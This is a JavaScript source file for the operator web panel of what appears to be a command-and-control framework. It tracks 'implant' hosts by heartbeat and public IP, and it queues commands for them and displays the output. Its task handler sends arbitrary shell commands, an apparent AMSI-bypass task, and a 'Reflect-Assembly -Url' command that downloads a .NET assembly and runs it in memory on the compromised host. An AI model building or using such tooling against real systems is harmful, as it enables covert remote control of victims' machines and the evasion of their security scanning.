//Maybe could pull this from the config file instead
var hostid = document.location.search
var url = _config.api.ManagementUrl + hostid

//Setting some global HTML variables
var table = document.getElementById('mytable');
var collapse = document.getElementById('mycollapse');
var hostIDHeader = document.getElementById('hostID-header');
var birthtimeHeader = document.getElementById('birthtime-header');
var heartbeatHeader = document.getElementById('heartbeat-header');
var publicipHeader = document.getElementById('public-ip-header');
var useragentHeader = document.getElementById('user-agent-header');
var input = document.getElementById('myinput');


//sort table data
const sort_by = (field, reverse, primer) => {

    const key = primer ?
      function(x) {
        return primer(x[field]);
      } :
      function(x) {
        return x[field];
      };
  
    reverse = !reverse ? 1 : -1;
  
    return function(a, b) {
      return a = key(a), b = key(b), reverse * ((a > b) - (b > a));
    };
  };

//Implant Table Fill
function populateTable(tableData) {
    table.innerHTML = '';
    //tableData.sort(sort_by(tableData.task, true));
    for (let data in tableData.task) {
        let value = tableData.task[data];
        let row = table.insertRow(-1);
        let name = row.insertCell(0);
        name.innerHTML = epoch2human(basicHTMLEncode(data));

        let quantity = row.insertCell(1);
        quantity.innerHTML = epoch2human(basicHTMLEncode(value.commandTime));

        let price = row.insertCell(2);
        price.innerHTML = basicHTMLEncode(value.command);

        let expiry = row.insertCell(3);
        expiry.innerHTML = "<pre>" + basicHTMLEncode(value.commandResponse) + "</pre>";
    }
}


function populateCollapse(tableData) {
    //collapse.innerHTML = '';
    //tableData.sort(sort_by(tableData.task, true));
    for (let data in tableData.task) {
        let value = tableData.task[data];

        //does element already exist
        var dataElement = document.getElementById(data);
        if (dataElement && dataElement.children.length == 2) {
            //console.log(dataElement)
            //console.log("Element " + data + " already exists")
        }
        else if (dataElement && value.commandResponse == undefined) {
            //Element already exists and no updates
        }
        else if (dataElement && value.commandResponse != undefined) {
            dataElement.getElementsByClassName('text-secondary')[0].className = "text-success"
            var addDiv = document.createElement('div')
            addDiv.className = "collapse-content pre-wrap";
            addDiv.innerHTML = "<pre-wrap>" + basicHTMLEncode(value.commandResponse) + "</pre-wrap>";
            dataElement.appendChild(addDiv);
        }
        else if (value.commandResponse == undefined) {
            console.log(value.commandResponse)
            //create details parent
            var details = document.createElement('details');
            details.className = "collapse-panel";
            details.id = data;
            details.setAttribute("open", true);
            //let detailsParent = collapse.appendChild(details);
            let detailsParent = collapse.insertBefore(details, collapse.firstChild);

            //add summary child
            var addSummary = document.createElement('summary')
            addSummary.className = "collapse-header";
            let summaryParent = detailsParent.appendChild(addSummary);

            //add summary content
            var timeRequested = document.createElement('span');
            timeRequested.className = "text-primary";
            timeRequested.innerHTML = "[ " + epoch2human(basicHTMLEncode(data)) + " ]$ ";
            summaryParent.appendChild(timeRequested);
            var command = document.createElement('span')
            command.innerHTML = basicHTMLEncode(value.command);
            command.className = "text-secondary"
            command.id = "waiting-task"
            summaryParent.appendChild(command);            
        }
        else {
            //create details parent
            var details = document.createElement('details');
            details.className = "collapse-panel";
            details.id = data;
            details.setAttribute("open", true);
            //let detailsParent = collapse.appendChild(details);
            let detailsParent = collapse.insertBefore(details, collapse.firstChild);

            //add summary child
            var addSummary = document.createElement('summary')
            addSummary.className = "collapse-header";
            let summaryParent = detailsParent.appendChild(addSummary);

            //add summary content
            var timeRequested = document.createElement('span');
            timeRequested.className = "text-primary";
            timeRequested.innerHTML = "[ " + epoch2human(basicHTMLEncode(data)) + " ]$ ";
            summaryParent.appendChild(timeRequested);
            var command = document.createElement('span')
            command.innerHTML = basicHTMLEncode(value.command);
            command.className ="text-success"
            summaryParent.appendChild(command);

            //add div child
            var addDiv = document.createElement('div')
            addDiv.className = "collapse-content pre-wrap";
            addDiv.innerHTML = "<pre-wrap>" + basicHTMLEncode(value.commandResponse) + "</pre-wrap>";
            detailsParent.appendChild(addDiv);
        }
    }
}

//Other implant info
function populateGeneral(tableData) {
    hostIDHeader.innerHTML = basicHTMLEncode(tableData.hostid);
    birthtimeHeader.innerHTML = "Birthtime - " + epoch2human(basicHTMLEncode(tableData.birthtime));
    heartbeatHeader.innerHTML = "Heartbeat - " + epoch2human(basicHTMLEncode(tableData.heartbeat));
    publicipHeader.innerHTML = "Public IP - " + basicHTMLEncode(tableData.public_ip_source);
    //useragentHeader.innerHTML = "User Agent - " + basicHTMLEncode(tableData.user_agent);

}

//Main get request
async function getJSON() {
    const responseObject = await fetch(url, {
        "headers": {
            "Authorization": bearer,
            "Content-Type": "application/json",
            "accept": "application/json",
        },
        "body": null,
        "method": "GET",
        "withCredentials": true,
        "mode": "cors"
    })
    const responseJSON = await responseObject.json()
    //populateTable(responseJSON);
    populateGeneral(responseJSON);
    populateCollapse(responseJSON);
}


//sendTask
async function sendTask(task) {
    if (task == "") {

    }
    else {
        var url = _config.api.ManagementUrl + "sendTask"
        const resp = await fetch(url, {
            "headers": {
                "Authorization": bearer,
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            "body": JSON.stringify({"hostid":hostid.split("=")[1],"task":task}),
            "method": "POST",
            "withCredentials": true,
            "mode": "cors"
        })
        const resp2 = await resp.text();
        //alert("New task " + resp2 + " queued for host id " + hostid.split("=")[1]);
        document.getElementById("inputTask").value = "";
    }
}

function sendTaskHandler(){
    if (taskSelection.value == "basic-command") {
        console.log(document.getElementById("inputTask").value)
        var task = document.getElementById("inputTask").value;
        sendTask(task);
    }
    else if (taskSelection.value == "amsi-rasta-custom") {
        sendTask("amsi-rasta-custom");
    }
    else if (taskSelection.value == "execute-assembly") {
        sendTask("execute-assembly");
        var url = document.getElementById("assembly-url").value;
        var arguments = document.getElementById("assembly-arguments").value;
        if (arguments == "") {
            sendTask("Reflect-Assembly -url " + url);
        }
        else {
            sendTask("Reflect-Assembly -Url " + url + " -Arguments '" + arguments + "'");
        }
    }
}

//listens for form submit
const submitTaskForm = document.getElementById('implantSendTask');
submitTaskForm.addEventListener('submit', function(event){event.preventDefault();sendTaskHandler();});


function toggleCollapse() {
    var collection = document.getElementsByClassName("collapse-panel");
    if (document.getElementById('switch-collapse').checked) {
        for(var index=0;index < collection.length;index++){
            console.log(collection[index].open);
            collection[index].open = false;
        }
    }
    else {
        for(var index=0;index < collection.length;index++){
            collection[index].open = true;
        }
    }
}

function toggleWidth() {
    if (toggleFullWidth.checked) {
        document.getElementById("inputTask").style = null
        document.getElementById("basic-command-div").setAttribute("class", "text-center m-auto w-800")
    }
    else {
        document.getElementById("inputTask").style = null
        document.getElementById("basic-command-div").setAttribute("class", "text-center m-auto w-500")
    }
}

function taskDisplayChange() {
    if (taskSelection.value == "basic-command"){
        document.getElementById("basic-command-div").style.display = "block"
        document.getElementById("execute-assembly-div").style.display = "none"
    }
    else if (taskSelection.value == "execute-assembly"){
        document.getElementById("execute-assembly-div").style.display = "block"
        document.getElementById("basic-command-div").style.display = "none"
    }
    else {
        document.getElementById("basic-command-div").style.display = "none"
        document.getElementById("execute-assembly-div").style.display = "none"
    }
}

const taskSelection = document.getElementById('select-task');
taskSelection.onchange = function(){taskDisplayChange()};


const toggleClicked = document.getElementById('switch-collapse');
const toggleSortAge = document.getElementById('switch-oldest');
const toggleFullWidth = document.getElementById('switch-full-width');

toggleClicked.onclick = function(){toggleCollapse()};
toggleSortAge.onclick = function(){alert("Not configured yet")};
toggleFullWidth.onclick = function(){toggleWidth()};

//refresh every 5 seconds (maybe have this configurable?)
getJSON();
setInterval(function(){
    getJSON();
}, 5000)



